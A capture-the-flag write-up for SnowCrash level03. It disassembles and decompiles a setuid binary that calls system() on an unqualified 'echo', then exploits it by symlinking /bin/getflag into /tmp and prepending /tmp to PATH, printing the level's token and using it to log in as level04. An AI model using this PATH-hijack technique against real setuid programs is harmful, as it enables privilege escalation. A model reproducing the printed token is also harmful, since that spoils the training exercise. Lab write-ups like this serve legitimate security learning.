# level03

For level 3 we are given a binary which doesn't seem to do much
```bash
level03@SnowCrash:~$ ls
level03
level03@SnowCrash:~$ ./level03
Exploit me
level03@SnowCrash:~$ 
```

However, disassembling the main function gives us more than enough to work with
```bash
level03@SnowCrash:~$ gdb -batch -ex 'file level03' -ex 'disassemble main'
Dump of assembler code for function main:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     and    $0xfffffff0,%esp
   0x080484aa <+6>:     sub    $0x20,%esp
   0x080484ad <+9>:     call   0x80483a0 <getegid@plt>
   0x080484b2 <+14>:    mov    %eax,0x18(%esp)
   0x080484b6 <+18>:    call   0x8048390 <geteuid@plt>
   0x080484bb <+23>:    mov    %eax,0x1c(%esp)
   0x080484bf <+27>:    mov    0x18(%esp),%eax
   0x080484c3 <+31>:    mov    %eax,0x8(%esp)
   0x080484c7 <+35>:    mov    0x18(%esp),%eax
   0x080484cb <+39>:    mov    %eax,0x4(%esp)
   0x080484cf <+43>:    mov    0x18(%esp),%eax
   0x080484d3 <+47>:    mov    %eax,(%esp)
   0x080484d6 <+50>:    call   0x80483e0 <setresgid@plt>
   0x080484db <+55>:    mov    0x1c(%esp),%eax
   0x080484df <+59>:    mov    %eax,0x8(%esp)
   0x080484e3 <+63>:    mov    0x1c(%esp),%eax
   0x080484e7 <+67>:    mov    %eax,0x4(%esp)
   0x080484eb <+71>:    mov    0x1c(%esp),%eax
   0x080484ef <+75>:    mov    %eax,(%esp)
   0x080484f2 <+78>:    call   0x8048380 <setresuid@plt>
   0x080484f7 <+83>:    movl   $0x80485e0,(%esp)
   0x080484fe <+90>:    call   0x80483b0 <system@plt>
   0x08048503 <+95>:    leave
   0x08048504 <+96>:    ret
End of assembler dump.
```

The call to system is reading a string at 0x80483b0
```bash
level03@SnowCrash:~$ gdb -batch -ex 'file level03' -ex 'x/s 0x80485e0'
0x80485e0:       "/usr/bin/env echo Exploit me"
```

Decompiling the binary through Ghidra gives some more readable output, which I manually cleaned up.
```c
int main()
{
    gid_t gid = getegid();
    uid_t uid = geteuid();
    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);
    return system("/usr/bin/env echo Exploit me");
}
```

By creating our own symbolic link to any binary and inserting `/tmp` into the PATH, we can execute whatever we want
Symbolic links are rather tricky to do securely, especially when `setuid` and friends are involved
```bash
level03@SnowCrash:~$ ln -s /bin/getflag /tmp/echo
level03@SnowCrash:~$ env PATH="/tmp:$PATH" ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$ rm -f /tmp/echo
level03@SnowCrash:~$ su level04
Password: qi0maab88jeaj46qoumi7maus
level04@SnowCrash:~$
```
